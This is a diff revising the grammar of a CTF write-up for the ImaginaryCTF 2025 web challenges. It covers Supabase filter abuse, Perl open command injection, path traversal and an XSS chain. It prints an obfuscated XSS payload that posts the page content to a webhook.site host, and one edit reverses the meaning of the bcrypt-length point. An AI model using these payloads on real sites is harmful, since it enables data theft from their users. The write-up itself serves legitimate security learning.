@@ -13,7 +13,7 @@ authors:
 ---
 
 
-ImaginaryCTF 2025 has just ended. I cleared all the web and this is the writeup for those challenges.
+ImaginaryCTF 2025 has just ended. I cleared all the web challenges and this is my writeup for them.
 
 ![image](https://hackmd.io/_uploads/SJxT6Dpceg.png)
 
@@ -21,11 +21,11 @@ ImaginaryCTF 2025 has just ended. I cleared all the web and this is the writeup 
 
 ![image](https://hackmd.io/_uploads/BJvjIc65le.png)
 
-This is a blackbox web challenge and the flag is stored as password of `admin` account .we have a register form: 
+This is a blackbox web challenge and the flag is stored as password of `admin` account. We are given a register form: 
 
 ![image](https://hackmd.io/_uploads/SkS-vcacge.png)
 
-When registered, there is a note making website, but there is not XSS here.
+After registration, we can access a note-making website. However, there is no XSS vulnerability here.
 
 ![image](https://hackmd.io/_uploads/B1yUwcacll.png)
 
@@ -39,19 +39,19 @@ So it takes my username and password then submit to cloud supabase to authentica
 select * from users where username=winky1234 and password=winky1234
 ```
 
-I delete my password and use only `eq` and errors started
+I deleted my password and use only `eq` and errors started to appear.
 
 ![image](https://hackmd.io/_uploads/HyYi55T9ge.png)
 
-So the eq is one of supabase operators let search for it 
+So the eq is one of supabase operators, let's search for it 
 
 https://zone-www-dot-9obe9a1tk-supabase.vercel.app/docs/reference/javascript/eq
 
-we also have neq operator
+We also have neq operator
 
 https://zone-www-dot-9obe9a1tk-supabase.vercel.app/docs/reference/javascript/neq
 
-So what we can do? we can change the password to neq.dummy so that it finds the username admin and password is not dummy and extract data from that.
+So what we can do? we can change the password to neq.dummy. This way, the query will look for the username admin where the password is not dummy, and we can extract the data from it.
 
 POC:
 
@@ -61,7 +61,7 @@ POC:
 
 ### Note
 
-we can also delete the password param like this:
+We can also delete the password param like this:
 
 ![image](https://hackmd.io/_uploads/ByYv3qT9eg.png)
 
@@ -73,7 +73,7 @@ This is just a certificate making website.
 
 ![image](https://hackmd.io/_uploads/BkOK6qTqgg.png)
 
-But the decsription says that we can't create a flag for user Eth007. I create it and it gives me REDACTED
+But the description says that we cannot create a flag for the user `Eth007`. I tried creating it, and the system returned `REDACTED`.
 
 ![image](https://hackmd.io/_uploads/HJDVC9a9ge.png)
 
@@ -370,7 +370,7 @@ The website:
 
 ![image](https://hackmd.io/_uploads/HJVYr3T9eg.png)
 
-when we register, there is an email to send temporary password. But it seems like being developed
+When we register, the system is supposed to send a temporary password by email. However, this feature seems like under development.
 
 ```js
 db.run(query, [nEmail, hash], (err) => {
@@ -413,7 +413,7 @@ bcrypt.hash(b, 10, (err, hash) => {
 
 ### The problem
 
-But the email can't be longer than 64 characters so we can send > 72 characters email.
+But the email can't be longer than 64 characters so we can't send > 72 characters email.
 
 ```js
 if (nEmail.length > 64) {
@@ -472,11 +472,11 @@ The website:
 
 ![image](https://hackmd.io/_uploads/S11J6T69eg.png)
 
-when I try to access an arbitrary endpoint, it gives 500 error. But the `open file` means that it maybe uses `open` function in perl.
+When I tried to access an arbitrary endpoint, the server returned a 500 error. However, the open file message suggests that it might be using the `open` function in `Perl`.
 
 ![image](https://hackmd.io/_uploads/HJ5zppp5xl.png)
 
-From this , `open` function in perl can run system command https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html
+From this blog, `open` function in Perl can run system command https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html
 
 I try to add | after command and still 500
 
@@ -726,15 +726,15 @@ Now use the solve script, we will have the real flag in remote
 
 ![image](https://hackmd.io/_uploads/Bya5zz1jgx.png)
 
-The source is too long so I refer it here :
+The source is too long so I refer to it here :
 
 https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/tree/main/Web/codenames-1/challenge
 
-First, we should look at what the web is. This is the website for guessing cells game. 
+First, let’s look at what the website is. It is a game where players guess cells.
 
 ![image](https://hackmd.io/_uploads/rycAWjksxl.png)
 
-The lobby, there are 2 modes. Hard mode is that if you click on the opposite color then lose.
+In the lobby, there are two modes. In hard mode, if you click on the opposite color, you immediately lose.
 
 ![image](https://hackmd.io/_uploads/SyTgfjkoel.png)
 
@@ -746,15 +746,15 @@ And this is the game:
 
 ![image](https://hackmd.io/_uploads/H1UCXi1sxx.png)
 
-Now let spot on what we can do. when we create a game, we can control the language to send to the server.
+Now let’s spot what we can do. When we create a game, we can control the language that is sent to the server.
 
 ![image](https://hackmd.io/_uploads/rkCGEsksxe.png)
 
-Then the server will read the language file in this code, takes all words and choose random 25 words from this to add to the game.
+Then the server reads the language file in the code, takes all the words, and randomly chooses 25 of them to add to the game.
 
 ![image](https://hackmd.io/_uploads/BkCYVj1iex.png)
 
-So it uses `os.path.join()` to concat the filename. Let's deep down to its behavior here: https://www.geeksforgeeks.org/python/python-os-path-join-method/ . You can see that if there is root directory or file, it will start from there.
+So it uses `os.path.join()` to concat the filename. Let's deep down to its behavior here: https://www.geeksforgeeks.org/python/python-os-path-join-method/ . As we can see, if there is root directory or file, it will start from there:
 
 ![image](https://hackmd.io/_uploads/BJqWro1olx.png)
 
@@ -792,18 +792,18 @@ if game.get('hard_mode'):
 emit('update', payload, room=code)
 ```
 
-So it's difficult to play and win except bruteforcing. I think it's not a good idea. So I come up with XSS bug because the bot will access to the game. Here is the bot's POV, so if we know the bot's board colors we can win: 
+So it's difficult to play and win except bruteforcing but I think it's not a good idea. So I come up with an XSS bug because the bot will access to the game. Here is the bot's POV, so if we know the bot's board colors we can win: 
 
 ![image](https://hackmd.io/_uploads/B1Hwsokill.png)
 
-Where we can have XSS? As we see, the username of bot is rendered but it is random so ignore it.
+Where can we have XSS? As we saw above, the bot’s username is rendered. However, since it is random, just ignore it.
 
 ```python
 username = f"BOT_{code}_" + os.urandom(4).hex()
 password = os.environ.get('BOT_SECRET_PREFIX', "") + os.urandom(16).hex()
 ```
 
-The thing we should look at is the cell content. It is innerHTML which is added from board which we loaded from file like codenames-1
+The thing we should focus on is the cell content. It is inserted using `innerHTML`, which comes from the board that we loaded from the file, like in codenames-1.
 
 ```js
 function renderBoard() {
@@ -822,15 +822,15 @@ for (var i = 0; i < board.length; i++) {
 ...
 ```
 
-So what if we can control what is displayed? we can notice that all users created will save information in profiles folder.
+So what if we can control what is displayed? We can notice that every user created will have their information saved in the `profiles` folder.
 
 ![image](https://hackmd.io/_uploads/BJYMAsJigl.png)
 
-And if we create a `.txt` file. The username will be written that file.
+And if we create a `.txt` username. Its information will be written to that file.
 
 ![image](https://hackmd.io/_uploads/H1FwAjJoee.png)
 
-Log in as hihi.txt and create the game with language `/app/profiles/hihi` and we have
+Log in as `hihi.txt` and create the game with language `/app/profiles/hihi` and we have
 
 ![image](https://hackmd.io/_uploads/Hyoj0jkile.png)
 
@@ -850,7 +850,7 @@ Before that, we use base64 form because the server blocks `.` and `/`
 <img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzcxZDdhNmRiLTE1NDEtNDBjZi1hMzk3LWIyZmZmNWYwM2NmYicse21ldGhvZDonUE9TVCcsYm9keTpkb2N1bWVudC5ib2R5LmlubmVySFRNTH0pCg')) >.txt
 ```
 
-Add a bot and start the game in hard mode. There are many requests have been sent, but we should notice the response have BOT identification.
+When we add a bot and start the game in hard mode, many requests are sent. However, we should notice that the response includes the bot’s identification.
 
 ![image](https://hackmd.io/_uploads/BkcJV3yilx.png)
 
@@ -858,14 +858,10 @@ Try to render:
 
 ![image](https://hackmd.io/_uploads/SkFAm2yjgx.png)
 
-Ok! Now we have the board, play as this to win
+OK! now that we have the board, just play and win.
 
 ![image](https://hackmd.io/_uploads/HJqT72Joxg.png)
 
-
-
-Now use the same strategy we will have the real flag in remote
+Using the same strategy we will have the real flag in remote
 
 `Flag: ictf{insane_mind_reading_908f13ab}`
-
-
